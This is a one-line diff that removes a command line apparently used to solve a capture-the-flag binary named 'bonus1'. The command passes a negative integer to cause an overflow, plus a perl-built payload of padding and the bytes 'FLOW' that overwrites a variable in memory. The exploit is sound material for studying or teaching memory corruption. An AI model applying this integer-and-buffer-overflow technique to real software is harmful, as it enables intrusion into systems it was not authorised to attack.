@@ -1,1 +1,0 @@
-/bonus1 -1073741812 `perl -e 'print "A"x40 . "\x46\x4c\x4f\x57" . "AAAAAAAAAAAAAA"'`
